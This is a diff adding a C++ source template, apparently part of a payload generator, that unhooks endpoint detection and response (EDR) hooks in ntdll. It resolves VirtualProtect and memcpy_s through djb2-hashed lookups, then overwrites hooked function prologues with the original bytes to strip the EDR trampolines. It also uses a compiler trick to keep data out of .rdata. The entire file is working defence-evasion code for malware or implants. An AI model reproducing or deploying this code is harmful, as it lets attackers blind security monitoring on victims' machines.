@@ -1,0 +1,55 @@
+#include "APIresolve.h"
+
+//Prevents compiler from putting buffers larger than 0xF into .rdata
+template <unsigned char C>
+struct noopt { [[clang::optnone]] unsigned char operator()() const { return C; } };
+
+#define NODATA(v) (noopt<(v)>{}())
+// int hashed_name;    djb2 hashed c string of the function name 
+// (function names are ANSI in the exports name table unlike like DLL names in ldr entries which are unicode)
+// unsigned char patch_bytes[8];   byte array of the original opcodes we are going to patch over the edr trampoline
+
+
+extern "C" uint64_t stomp(void)
+{
+	unsigned char functions[] = { {{.Init_objs}} };
+    uint64_t virtualprotect_ptr = 0x00;
+	int HASH_memcpy_s = 0x77f62642;
+	uint64_t memcpy_s_ptr = 0x00;
+	
+    typedef INT(WINAPI* MEMCPY_S)(uint64_t, SIZE_T, uint64_t, SIZE_T);
+
+	virtualprotect_ptr = getFunctionPtr(HASH_kernel32, HASH_VirtualProtect);
+	if (virtualprotect_ptr == 0x00)
+	{
+		return 1;
+	}
+	memcpy_s_ptr = getFunctionPtr(HASH_ntdll, HASH_memcpy_s);
+	if (memcpy_s_ptr == 0x00)
+	{
+		return 1;
+	}
+	
+    int i;
+	for(i = 0; i<{{.Num}}; i++)
+	{
+		uint64_t hookedfunction_ptr = 0x00;
+		DWORD oldProtect = 0x00;
+		DWORD holder = 0x00;
+		int hash_name_offset = i *12;
+		int bytes_buf_offset = hash_name_offset + 4;
+		uint32_t hash_name_int = *(int*)(functions+hash_name_offset);
+		uint64_t patch_bytes = (uint64_t)functions+bytes_buf_offset;
+		hookedfunction_ptr = getFunctionPtr(HASH_ntdll, hash_name_int);
+		if (hookedfunction_ptr == 0x00)
+		{
+			return 1;
+		}
+		
+		((VIRTUALPROTECT)virtualprotect_ptr)(hookedfunction_ptr,sizeof(patch_bytes),PAGE_EXECUTE_READWRITE,&oldProtect);
+		((MEMCPY_S)memcpy_s_ptr)(hookedfunction_ptr, sizeof(patch_bytes),patch_bytes,sizeof(patch_bytes));
+		((VIRTUALPROTECT)virtualprotect_ptr)(hookedfunction_ptr,sizeof(patch_bytes),oldProtect, &holder);
+	}
+
+	return 0;
+}
